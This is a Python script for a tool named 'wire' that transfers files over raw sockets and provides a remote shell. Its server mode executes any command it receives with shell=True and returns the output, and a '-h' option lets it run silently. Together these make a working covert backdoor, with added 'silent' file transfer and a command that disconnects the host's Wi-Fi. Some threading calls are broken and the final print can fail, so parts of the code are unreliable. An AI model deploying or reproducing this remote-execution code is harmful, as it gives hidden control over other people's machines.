import sys
import subprocess
import socket
import threading
import tqdm
import os


BUFFER_SIZE = 4096
SEPARATOR = "<BLOCK_SEPERATOR>"

def receive_files(host, port):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  sock.bind((host, port))
  sock.listen(5)
  print(f'[+] Listning On : {socket.gethostbyname(socket.gethostname())}')
  print(f'[+] At Port : {port}')
  print("")
  
  client_socket, address = sock.accept()
  print(f"[!] {address} connected.")
  print("")
  print("")
  
  received = client_socket.recv(BUFFER_SIZE).decode()
  filename, filesize = received.split(SEPARATOR)
  filename = os.path.basename(filename)
  filesize = int(filesize)
  
  progress = tqdm.tqdm(range(filesize), f"[*] Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
  with open(filename, "wb") as f:
    while True:
      # read 1024 bytes from the socket (receive)
      bytes_read = client_socket.recv(BUFFER_SIZE)
      if not bytes_read:
          break
      f.write(bytes_read)
      progress.update(len(bytes_read))

  client_socket.close()
  sock.close()

def silent_receive_files(host, port):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
  sock.bind((host, port))
  sock.listen(5)
  
  client_socket, address = sock.accept()
  
  received = client_socket.recv(BUFFER_SIZE).decode()
  filename, filesize = received.split(SEPARATOR)
  filename = os.path.basename(filename)
  filesize = int(filesize)
  
  with open(filename, "wb") as f:
    while True:
      # read 1024 bytes from the socket (receive)
      bytes_read = client_socket.recv(BUFFER_SIZE)
      if not bytes_read:
          break
      f.write(bytes_read)

  client_socket.close()
  sock.close()

def send_file(filename, host, port):
    filesize = os.path.getsize(filename)
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected!")
    print("")
    print("")

    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"[*] Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break

            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()  

def silent_send_file(host, port):
    filename = input("[?] Enter file path : ")
    filesize = os.path.getsize(filename)
    s = socket.socket()
    s.connect((host, port))

    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"[*] Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break

            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()  


def noargs_err():
    print("[!] Wire needs below system arguments to execute but some are missing --")
    print("")
    print("   + mode : The current oparating mode")
    print("          (-s, -r, ui)")
    print("")
    print("   + host : The ip address of host or local device")
    print("          (localhost, x.x.x.x)")
    print("")
    print("   + port : The port which is uused for transmission")
    print("          (any port that mathces the sencder or receiver)")
    print("")

def send_commands(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        message = input("[$] Shell > ")

        if message.lower() == ':exit':
            break
        elif message.lower() == ':breakint':
            message = "netsh wlan disconnect"
            client_socket.send(message.encode())
            response = client_socket.recv(1024)
            print(response.decode())
        elif message.lower() == ':send_file':
            thread_fs = threading.Thread(silent_send_file(host, 2000))
            message = ":send_file"
            client_socket.send(message.encode())
            thread_fs.start()
        elif message.lower() == '?':
            print("")
            print("[*] :exit       :   Quit the shell")
            print("[*] :breakint   :   Disconnect form internet (May break the shell connection)")
            print("[*] :send_file  :   Sends files")
            print("")
        else:
            client_socket.send(message.encode())
            response = client_socket.recv(1024)
            print(response.decode())

    client_socket.close()

def start_command_server(host, port, operatingmode):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    if operatingmode == "-h":
        pass
    else:
        print(f'[+] Server listening on port {port}')
        print(f'[+] Server listening on port {port}')
        print("")

    conn, addr = server_socket.accept()
    if operatingmode == "-h":
        pass
    else:
        print(f'[+] Connection from {addr}')
        print("")
        print("")

    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(f'{data.decode()}')

        if data.decode() == ":send_file":
            thread_fr = threading.Thread(receive_files(host, 2000))
            thread_fr.start()
            conn.send("Done...".encode())
        
        else:
            try:
                output = subprocess.check_output(data.decode(), shell=True, stderr=subprocess.STDOUT)
                response = output.decode()
            except subprocess.CalledProcessError as e:
                response = e.output.decode()
        
            conn.send(response.encode())

    conn.close()
    server_socket.close()


if __name__ == "__main__":
    if len(sys.argv) <= 1 :
       noargs_err()
       sys.exit("[!] EER! -- Tnsufficient Arguments")

    mode = sys.argv[1]

    if mode.lower() == "ui":
        print("UI")
        sys.exit("Def Exit.")

    if mode.lower() == "-r":
        if len(sys.argv) < 4:
            print("[*] Usage : wire -r <host> <port>")
            sys.exit("[!] EER! -- Tnsufficient Arguments")

        host = sys.argv[2]
        port = int(sys.argv[3])
        receive_files(host, port)
    
    if mode.lower() == "-s":
        if len(sys.argv) < 5:
            print("[*] Usage : wire -s <host> <port> <file>")
            sys.exit("[!] EER! -- Tnsufficient Arguments")

        host = sys.argv[2]
        port = int(sys.argv[3])
        file = sys.argv[4]
        send_file(file, host, port)
    
    if mode.lower() == "-shell":
        if len(sys.argv) < 5:
            print("[*] Usage : wire -shell <host> <port> <mode -h or -s>")
            sys.exit("[!] EER! -- Tnsufficient Arguments")

        host = sys.argv[2]
        port = int(sys.argv[3])
        opmode = sys.argv[4]
        start_command_server(host, port, opmode)
    
    if mode.lower() == "-con":
        if len(sys.argv) < 4:
            print("[*] Usage : wire -con <host> <port>")
            sys.exit("[!] EER! -- Tnsufficient Arguments")

        host = sys.argv[2]
        port = int(sys.argv[3])
        send_commands(host, port)

    
    print(mode, host, port)

